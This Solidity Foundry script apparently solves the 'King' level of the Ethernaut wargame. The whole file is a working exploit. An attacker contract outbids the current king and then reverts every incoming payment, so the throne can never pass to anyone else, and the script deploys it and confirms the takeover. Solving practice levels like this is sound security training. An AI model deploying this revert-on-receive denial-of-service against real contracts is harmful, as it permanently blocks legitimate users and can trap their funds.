// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {King} from "../src/09_King.sol";

contract UnmovableKing {
	address target;
	constructor (address king) payable {
		target = king;
	}

	function attack() public {
		(bool success, ) = target.call{value: address(this).balance}("");
		require(success);
	}

	receive() external payable {
		// we revert on all incoming tx
		revert("Dont want any");
	}
}

contract Exploit is Script {
	function run() public {
		vm.startBroadcast();

		// setup
		address target = vm.envAddress("INSTANCE");
		uint256 prize = address(target).balance;
		console2.log("Price to beat: ", prize);
		UnmovableKing attacker = new UnmovableKing{value: prize}(payable(target));
		console2.log("Starting Balance: ", address(attacker).balance);
		// attack
		console2.log("sending funds... ");
		attacker.attack();

		// verify
		King king = King(payable(target));
		require(king._king() == address(attacker), "Exploit failed");
		console2.log("We replaced the king. The throne is us for eternity");

		vm.stopBroadcast();
	}
}
